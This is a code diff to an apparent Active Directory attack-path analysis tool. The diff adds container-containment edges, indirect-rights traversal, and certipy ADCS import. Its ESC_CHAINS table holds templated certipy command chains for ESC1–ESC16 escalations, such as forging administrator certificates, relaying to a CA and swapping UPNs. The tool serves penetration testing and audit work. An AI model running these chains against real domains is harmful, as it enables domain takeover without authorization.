@@ -195,8 +195,12 @@ def edge_rank(edge, deg=None):
 
 
 def path_traversable(edge):
+    # Traversable for attack paths: any abusable right, group membership, or OU/
+    # Container containment. Containment lets a path flow from a container you
+    # control down into the objects it holds — the D.Anderson -GenericAll-> OU
+    # -Contains-> E.Rodriguez -AddSelf-> … chain the writeup follows.
     right = key(edge["right_name"])
-    return bool(edge["abusable"]) or right in {"memberof"}
+    return bool(edge["abusable"]) or right in {"memberof", "contains"}
 
 
 def db():
@@ -344,6 +348,14 @@ def parse_bloodhound(path, domain_name=None):
             if msid:
                 ensure(msid, member.get("ObjectType", "Base"))
                 edges.append((msid, sid, "MemberOf", member))
+        # OU/Container/Domain containment: control over a container carries down to
+        # the objects it holds (the writeup's D.Anderson -GenericAll-> Marketing OU
+        # -Contains-> E.Rodriguez opening). Direction: container -> child.
+        for child in row.get("ChildObjects") or []:
+            cid = child.get("ObjectIdentifier") if isinstance(child, dict) else child
+            if cid:
+                ensure(cid, child.get("ObjectType", "Base") if isinstance(child, dict) else "Base")
+                edges.append((sid, cid, "Contains", child if isinstance(child, dict) else {}))
         for item in row.get("AllowedToAct") or []:
             aid = item.get("ObjectIdentifier") if isinstance(item, dict) else item
             if aid:
@@ -548,16 +560,21 @@ def graph_payload(domain_id, view="overview", q="", focus="", rel="abusable", li
     rel = rel or "abusable"
     if focus and focus in by_sid:
         visible.add(focus)
+        # "Abusable" focus = exploitable edges, and containment (controlling an
+        # OU/Container IS how you reach the objects it holds), so the exploit
+        # relationship is never hidden just because Contains isn't a right.
+        def _abusable_focus(edge):
+            return bool(edge["abusable"]) or key(edge["right_name"]) == "contains"
         if rel in ("outbound", "all", "abusable"):
             for edge in out[focus]:
-                if rel == "abusable" and not edge["abusable"]:
+                if rel == "abusable" and not _abusable_focus(edge):
                     continue
                 visible.add(edge["source_sid"])
                 visible.add(edge["target_sid"])
                 edge_scope.add(edge["id"])
         if rel in ("inbound", "all", "abusable"):
             for edge in inc[focus]:
-                if rel == "abusable" and not edge["abusable"]:
+                if rel == "abusable" and not _abusable_focus(edge):
                     continue
                 visible.add(edge["source_sid"])
                 visible.add(edge["target_sid"])
@@ -763,6 +780,8 @@ def node_detail(domain_id, sid):
         (domain_id, sid),
     ).fetchall()
     domain = con.execute("SELECT name FROM domains WHERE id=?", (domain_id,)).fetchone()["name"]
+    direct_pairs = {(key(e["right_name"]), e["target_sid"]) for e in outgoing if e["abusable"]}
+    delegated = group_delegated(con, domain_id, sid, node["label"], domain, direct_pairs)
     con.close()
     try:
         props = json.loads(node["props"] or "{}")
@@ -770,6 +789,7 @@ def node_detail(domain_id, sid):
         props = {}
     return {
         "id": node["sid"],
+        "groupDelegated": delegated,
         "label": node["label"],
         "type": node["type"],
         "highValue": bool(node["high_value"]),
@@ -784,7 +804,8 @@ def node_detail(domain_id, sid):
                 "targetType": e["target_type"],
                 "right": e["right_name"],
                 "abusable": bool(e["abusable"]),
-                "abuse": abuse_for(e["right_name"], node["label"], e["target_label"], domain),
+                "abuse": edge_abuse(e, node["label"], domain),
+                **_edge_esc(e),
             }
             for e in outgoing
         ],
@@ -813,6 +834,243 @@ def abuse_for(right, src, dst, domain):
         }
         for row in rows
     ]
+
+
+# Full control over an object (any of these ⇒ you can rewrite its DACL / take it over).
+CONTROL_RIGHTS = {"genericall", "genericwrite", "writedacl", "writeowner", "owns"}
+# Edges that let a principal ACT THROUGH a group: already a member (MemberOf), or
+# able to join/seize it (AddSelf/AddMember, or full control over the group object).
+GROUP_GAIN = {"memberof", "addself", "addmember"} | CONTROL_RIGHTS
+# Containers whose control carries DOWN to the objects they hold (via Contains).
+# Domain is excluded on purpose — control there is domain-wide (DCSync-class) and
+# would dump every object as a card; it's already surfaced as a direct edge.
+CONTAINER_TYPES = {"OU", "Container"}
+
+
+def group_delegated(con, domain_id, sid, node_label, domain_name, exclude):
+    """Every abusable right a principal ULTIMATELY wields indirectly — through group
+    membership AND through control of an OU/Container that holds other objects.
+
+    Walk, transitively from `sid`:
+      • group-gain edges (MemberOf / AddSelf / AddMember / full control) into groups,
+        then surface each group's abusable outbound rights; and
+      • control edges (GenericAll/Write*/Owns) into an OU/Container, then treat every
+        object it Contains as a full takeover (the writeup's D.Anderson -GenericAll->
+        Marketing OU -Contains-> E.Rodriguez opening).
+    Each result carries the trail that grants it. `exclude` is the set of
+    (right-key, target-sid) already held DIRECTLY, so nothing is duplicated.
+    """
+    rows = con.execute(
+        """
+        SELECT e.source_sid, e.target_sid, e.right_name, n.label tlabel, n.type ttype
+        FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.target_sid
+        WHERE e.domain_id=?
+        """,
+        (domain_id,),
+    ).fetchall()
+    gain = defaultdict(list)          # src -> [(reached_sid, via_right, label, type)]
+    contains = defaultdict(list)      # container_sid -> [(child_sid, child_label, child_type)]
+    for r in rows:
+        k = key(r["right_name"])
+        tt = r["ttype"]
+        if (tt == "Group" and k in GROUP_GAIN) or (tt in CONTAINER_TYPES and k in CONTROL_RIGHTS):
+            gain[r["source_sid"]].append((r["target_sid"], r["right_name"], r["tlabel"], tt))
+        if r["right_name"] == "Contains":
+            contains[r["source_sid"]].append((r["target_sid"], r["tlabel"], tt))
+    reached, seen, stack = {}, {sid}, [(sid, [])]
+    while stack:
+        cur, chain = stack.pop()
+        for tgt, right, tlabel, ttype in gain.get(cur, []):
+            if tgt in seen:
+                continue
+            seen.add(tgt)
+            nchain = chain + [{"via": right, "group": tlabel, "groupSid": tgt}]
+            reached[tgt] = (nchain, ttype)
+            stack.append((tgt, nchain))
+    if not reached:
+        return []
+    result, seen_pair = [], set(exclude)
+    for tgt, (chain, ttype) in reached.items():
+        if ttype == "Group":
+            outs = con.execute(
+                """
+                SELECT e.right_name, e.target_sid, e.props, n.label target_label, n.type ttype
+                FROM edges e JOIN nodes n ON n.domain_id=e.domain_id AND n.sid=e.target_sid
+                WHERE e.domain_id=? AND e.source_sid=? AND e.abusable=1
+                """,
+                (domain_id, tgt),
+            ).fetchall()
+            for e in outs:
+                if e["target_sid"] == sid:
+                    continue
+                pair = (key(e["right_name"]), e["target_sid"])
+                if pair in seen_pair:
+                    continue
+                seen_pair.add(pair)
+                result.append({
+                    "target": e["target_sid"], "targetLabel": e["target_label"], "targetType": e["ttype"],
+                    "right": e["right_name"], "via": chain,
+                    "abuse": edge_abuse(e, node_label, domain_name),
+                    **_edge_esc(e),
+                })
+        elif ttype in CONTAINER_TYPES:
+            # Controlling the container ⇒ full control over each object it holds.
+            for child_sid, child_label, child_type in contains.get(tgt, [])[:60]:
+                if child_sid == sid or child_type in CONTAINER_TYPES:
+                    continue
+                pair = ("genericall", child_sid)
+                if pair in seen_pair:
+                    continue
+                seen_pair.add(pair)
+                result.append({
+                    "target": child_sid, "targetLabel": child_label, "targetType": child_type,
+                    "right": "GenericAll", "via": chain,
+                    "abuse": abuse_for("GenericAll", node_label, child_label, domain_name),
+                })
+    result.sort(key=lambda r: (RIGHT_RANK.get(key(r["right"]), 80), r["targetLabel"] or ""))
+    return result
+
+
+# ---------------------------------------------------------------------------
+#  ADCS / certipy ingestion — turn `certipy find -json` into ESC edges so the
+#  panel flags exactly which principal is vulnerable to which ESC, with the
+#  full command chain (which template, which CA) already filled in. Because the
+#  enrollable principal is usually a GROUP, group-delegation then propagates the
+#  ESC to every member automatically.
+# ---------------------------------------------------------------------------
+# {ca}, {tpl}, {dom} are filled at import; <…> stays for the operator.
+ESC_CHAINS = {
+    "ESC1": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom}",
+             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
+    "ESC2": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
+             "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>"],
+    "ESC3": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
+             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template User -pfx <agent>.pfx -on-behalf-of '{dom}\\administrator'",
+             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
+    "ESC4": ["certipy template -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -template {tpl} -write-default-configuration -save-old",
+             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom}",
+             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
+    "ESC6": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom}",
+             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
+    "ESC7": ["certipy ca -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -add-officer <user>",
+             "certipy ca -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -enable-template SubCA",
+             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template SubCA -upn administrator@{dom}   # note the request id",
+             "certipy ca -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -issue-request <req-id>",
+             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -retrieve <req-id>"],
+    "ESC8": ["certipy relay -target 'http://{ca}' -template DomainController",
+             "certipy auth -pfx <dc>.pfx -dc-ip <dc-ip>"],
+    "ESC9": ["certipy account -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn administrator@{dom}",
+             "certipy req -u '<victim>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
+             "certipy account -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn <victim>@{dom}",
+             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
+    "ESC13": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
+              "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>"],
+    "ESC15": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom} -application-policies 'Client Authentication'",
+              "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
+    "ESC16": ["certipy account -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn administrator@{dom}",
+              "certipy req -u '<victim>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template User",
+              "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
+}
+
+
+def esc_commands(esc, ca, tpl, dom):
+    chain = ESC_CHAINS.get(esc.upper()) or [
+        "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
+        "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>",
+    ]
+    return [{"os": "linux", "tool": "certipy", "cmd": c.format(ca=ca, tpl=tpl, dom=dom)} for c in chain]
+
+
+def edge_abuse(row, src_label, domain):
+    """Commands for an edge: precomputed ADCS chain from its props if present,
+    else the generic ABUSE map for the right."""
+    try:
+        p = json.loads(row["props"] or "{}") if "props" in row.keys() else {}
+    except Exception:
+        p = {}
+    if p.get("cmds"):
+        return p["cmds"]
+    return abuse_for(row["right_name"], src_label, row["target_label"], domain)
+
+
+def _edge_esc(row):
+    """Expose the ESC id/description on an ADCS edge (empty dict for normal edges)."""
+    try:
+        p = json.loads(row["props"] or "{}") if "props" in row.keys() else {}
+    except Exception:
+        p = {}
+    return {"esc": p["esc"], "escDesc": p.get("desc", "")} if p.get("esc") else {}
+
+
+def _certipy_domain(cas):
+    for ca in cas.values():
+        subj = ca.get("Certificate Subject") or ""
+        parts = [seg.split("=", 1)[1] for seg in subj.split(",") if seg.strip().upper().startswith("DC=")]
+        if parts:
+            return ".".join(parts).lower()
+    return None
+
+
+def import_certipy(con, domain_id, data):
+    cas = data.get("Certificate Authorities") or {}
+    tpls = data.get("Certificate Templates") or {}
+    dom_row = con.execute("SELECT name FROM domains WHERE id=?", (domain_id,)).fetchone()
+    dom = _certipy_domain(cas) or (dom_row["name"] if dom_row else "domain.local")
+    # name → sid for resolving enrollable principals to existing graph nodes
+    name2sid = {}
+    for r in con.execute("SELECT sid,label,props FROM nodes WHERE domain_id=?", (domain_id,)):
+        lbl = (r["label"] or "").upper()
+        name2sid.setdefault(lbl, r["sid"])
+        name2sid.setdefault(lbl.split("@")[0], r["sid"])
+        try:
+            sam = (json.loads(r["props"] or "{}") or {}).get("samaccountname")
+            if sam:
+                name2sid.setdefault(sam.upper(), r["sid"])
+        except Exception:
+            pass
+
+    def upsert_node(sid, label, ntype, high, props):
+        con.execute(
+            "INSERT INTO nodes(domain_id,sid,label,type,high_value,owned,props) VALUES(?,?,?,?,?,0,?) "
+            "ON CONFLICT(domain_id,sid) DO UPDATE SET label=excluded.label, type=excluded.type, high_value=excluded.high_value, props=excluded.props",
+            (domain_id, sid, label, ntype, 1 if high else 0, json.dumps(props)),
+        )
+
+    n_nodes = n_edges = n_tpls = 0
+    for ca in cas.values():
+        can = ca.get("CA Name") or "CA"
+        upsert_node("ADCS-CA-%s" % can, can, "EnterpriseCA", True, {"dnsName": ca.get("DNS Name"), "subject": ca.get("Certificate Subject")})
+        n_nodes += 1
+    for t in tpls.values():
+        vulns = t.get("[!] Vulnerabilities") or {}
+        if not vulns:
+            continue
+        tname = t.get("Template Name") or "Template"
+        tsid = "ADCS-TPL-%s" % tname
+        upsert_node(tsid, tname, "CertTemplate", True, {"escs": list(vulns.keys()), "cas": t.get("Certificate Authorities"), "enabled": t.get("Enabled")})
+        n_nodes += 1
+        n_tpls += 1
+        ca_name = (t.get("Certificate Authorities") or ["<ca>"])[0]
+        principals = set(t.get("[+] User Enrollable Principals") or [])
+        perms = t.get("Permissions", {}) or {}
+        ep = perms.get("Enrollment Permissions", {}) or {}
+        principals |= set(ep.get("Enrollment Rights", []) or [])
+        for esc, desc in vulns.items():
+            props = json.dumps({"esc": esc, "desc": desc, "cmds": esc_commands(esc, ca_name, tname, dom)})
+            for pr in principals:
+                pname = (pr or "").split("\\")[-1].upper()
+                psid = name2sid.get(pname)
+                if not psid:
+                    continue
+                con.execute(
+                    "INSERT INTO edges(domain_id,source_sid,target_sid,right_name,abusable,props) VALUES(?,?,?,?,1,?) "
+                    "ON CONFLICT(domain_id,source_sid,target_sid,right_name) DO UPDATE SET abusable=1, props=excluded.props",
+                    (domain_id, psid, tsid, "ADCS" + esc.upper(), props),
+                )
+                n_edges += 1
+    con.execute("UPDATE domains SET node_count=(SELECT COUNT(*) FROM nodes WHERE domain_id=?), edge_count=(SELECT COUNT(*) FROM edges WHERE domain_id=?) WHERE id=?", (domain_id, domain_id, domain_id))
+    con.commit()
+    return {"templates": n_tpls, "nodes": n_nodes, "edges": n_edges}
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -913,6 +1171,23 @@ class Handler(BaseHTTPRequestHandler):
                 domain_id = import_zip(tmp, name, getattr(fileitem, "filename", None), owned)
                 tmp.unlink(missing_ok=True)
                 return self.send_json({"ok": True, "domainId": domain_id})
+            if path.startswith("/api/domain/") and path.endswith("/adcs"):
+                domain_id = int(path.split("/")[3])
+                form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={"REQUEST_METHOD": "POST"})
+                fileitem = form["json"] if "json" in form else None
+                if fileitem is None or not getattr(fileitem, "file", None):
+                    return self.send_json({"error": "missing certipy json (field 'json')"}, 400)
+                try:
+                    data = json.loads(fileitem.file.read().decode("utf-8", "ignore"))
+                except Exception as exc:
+                    return self.send_json({"error": "not valid JSON: %s" % exc}, 400)
+                con = db()
+                if not con.execute("SELECT 1 FROM domains WHERE id=?", (domain_id,)).fetchone():
+                    con.close()
+                    return self.send_json({"error": "domain not found"}, 404)
+                stats = import_certipy(con, domain_id, data)
+                con.close()
+                return self.send_json({"ok": True, **stats})
             if path.startswith("/api/domain/") and "/owned/" in path:
                 parts = path.split("/")
                 domain_id = int(parts[3])
@@ -927,6 +1202,26 @@ class Handler(BaseHTTPRequestHandler):
                     con.execute("UPDATE nodes SET owned=? WHERE domain_id=? AND sid=?", (owned, domain_id, sid))
                 con.close()
                 return self.send_json({"ok": True, "owned": bool(owned)})
+        except Exception as exc:
+            return self.send_json({"error": str(exc)}, 500)
+        self.send_error(404)
+
+    def do_DELETE(self):
+        parsed = urllib.parse.urlparse(self.path)
+        parts = parsed.path.split("/")
+        try:
+            # DELETE /api/domain/{id}  → drop the domain and cascade its nodes/edges
+            if len(parts) == 4 and parts[1] == "api" and parts[2] == "domain" and parts[3].isdigit():
+                domain_id = int(parts[3])
+                con = db()  # db() sets PRAGMA foreign_keys=ON → ON DELETE CASCADE
+                row = con.execute("SELECT name FROM domains WHERE id=?", (domain_id,)).fetchone()
+                if not row:
+                    con.close()
+                    return self.send_json({"error": "not found"}, 404)
+                with con:
+                    con.execute("DELETE FROM domains WHERE id=?", (domain_id,))
+                con.close()
+                return self.send_json({"ok": True, "deleted": row["name"]})
         except Exception as exc:
             return self.send_json({"error": str(exc)}, 500)
         self.send_error(404)
